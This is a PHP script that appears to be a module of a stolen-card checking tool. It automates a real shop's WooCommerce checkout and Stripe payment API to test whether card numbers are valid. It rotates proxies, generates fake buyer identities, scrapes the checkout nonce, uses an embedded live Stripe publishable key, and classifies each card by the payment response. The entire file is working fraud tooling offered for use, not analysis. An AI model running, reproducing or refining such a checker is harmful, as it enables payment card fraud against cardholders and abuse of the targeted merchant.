<?php

$retry = 0;

$isRetry = False;

start:

if ($isRetry) {
	$retry++;

	$this->curlx->DeleteCookie();
}

if ($retry > 2) {
	if (empty($empty)) $empty = 'Maximum Retrys Reached';

	$status = ['emoji' => '❌', 'status' => 'DECLINED', 'msg' => "RETRY - $empty!"];

	goto end;
}

$isRetry = True;

$server = $this->proxy();

$fake = $this->tools->GetUser();

$cookie = uniqid();

$r1 = $this->curlx->Get('https://www.pilatesscotland.co.uk/checkout/?add-to-cart=15613', null, $cookie, $server['proxy']);

if (!$r1->success) goto start;

$nonce = $this->getstr($r1->body, 'name="woocommerce-process-checkout-nonce" value="', '"');

if (empty($nonce)) {
	$empty = 'First Request Token is Empty!';

	goto start;
}

$data = 'type=card&owner[name]='.$fake->first.'+'.$fake->last.'&owner[address][line1]=12+main+street&owner[address][state]=NY&owner[address][city]=Brewster&owner[address][postal_code]=10509&owner[address][country]=US&owner[email]='.urlencode($fake->email).'&owner[phone]=2564567654&card[number]='.$cc.'&card[cvc]=000&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F13a1d358b%3B+stripe-js-v3%2F13a1d358b&time_on_page='.rand(50000, 100000).'&key=pk_live_51H2zWCGINbUS1AIlrWXgqdBLGXSmvOij8fEroJTBcGegJkLca36TtGkt8NPXDgtnSPjscIIkX5VDRuRwr4ToPIIL00fz6lzawo';

$r2 = $this->curlx->Post('https://api.stripe.com/v1/sources', $data, null, $cookie, $server['proxy']);

if (!$r2->success) goto start;

$json_r2 = json_decode($r2->body);

if (isset($json_r2->error)) {
	$status = $this->response->ErrorHandler($json_r2->error);

	goto end;
}

if (!isset($json_r2->id)) {
	$empty = 'Second Request Token is Empty';

	goto start;
}

$src = $json_r2->id;

$pys_browser_time = date(''.(['00-01', '01-02', '02-03', '03-04', '04-05', '05-06', '06-07', '07-08', '08-09', '09-10', '10-11', '11-12', '12-13', '13-14', '14-15', '15-16', '16-17', '17-18', '18-19', '19-20', '20-21', '21-22', '22-23', '23-24'])[date('G', time())].'|l|F', time());

$data = 'billing_first_name='.$fake->first.'&billing_last_name='.$fake->last.'&billing_country=US&billing_address_1=12+main+street&billing_address_2=&billing_city=Brewster&billing_state=NY&billing_postcode=10509&billing_phone=2564567654&billing_email='.urlencode($fake->email).'&billing_company=&account_password=%23CBAzyx321%24&shipping_first_name=&shipping_last_name=&shipping_country=GB&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=&shipping_postcode=&shipping_company=&order_comments=&payment_method=stripe&terms=on&terms-field=1&gdpr_terms=1&woocommerce-process-checkout-nonce='.$nonce.'&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&pys_utm=utm_source%3Aundefined%7Cutm_medium%3Aundefined%7Cutm_campaign%3Aundefined%7Cutm_term%3Aundefined%7Cutm_content%3Aundefined&pys_utm_id=fbadid%3Aundefined%7Cgadid%3Aundefined%7Cpadid%3Aundefined%7Cbingid%3Aundefined&pys_browser_time='.urlencode($pys_browser_time).'&pys_landing=https%3A%2F%2Fwww.pilatesscotland.co.uk%2Fcheckout%2F&pys_source=direct&pys_order_type=normal&last_pys_landing=https%3A%2F%2Fwww.pilatesscotland.co.uk%2Fcheckout%2F&last_pys_source=direct&last_pys_utm=utm_source%3Aundefined%7Cutm_medium%3Aundefined%7Cutm_campaign%3Aundefined%7Cutm_term%3Aundefined%7Cutm_content%3Aundefined&last_pys_utm_id=fbadid%3Aundefined%7Cgadid%3Aundefined%7Cpadid%3Aundefined%7Cbingid%3Aundefined&stripe_source='.$src;

$r3 = $this->curlx->Post('https://www.pilatesscotland.co.uk/?wc-ajax=checkout', $data, null, $cookie, $server['proxy']);

if (!$r3->success) goto start;

if (strpos($r3->body, 'result":"success') !== false) {
	$status = $this->response->Stripe($r3->body, null, 'auth');

	goto end;
}

$msg = $this->getstr($r3->body, 'messages":"', '","');

if (!empty($msg)) {
	$err = trim(strip_tags(empty($tmp = $this->getstr($msg, '<li>\n\t\t\t', '\t')) ? $msg : $tmp));

	$status = $this->response->Stripe($r3->body, $err, 'auth');

	goto end;
}

$r4 = $this->curlx->Get('https://www.pilatesscotland.co.uk/checkout/?add-to-cart=15613', null, $cookie, $server['proxy']);

if (!$r4->success) goto start;

$err = trim(strip_tags($this->getstr($r4->body, 'error" role="alert">', '</div')));

$status = $this->response->Stripe($err, $err, 'auth');

end: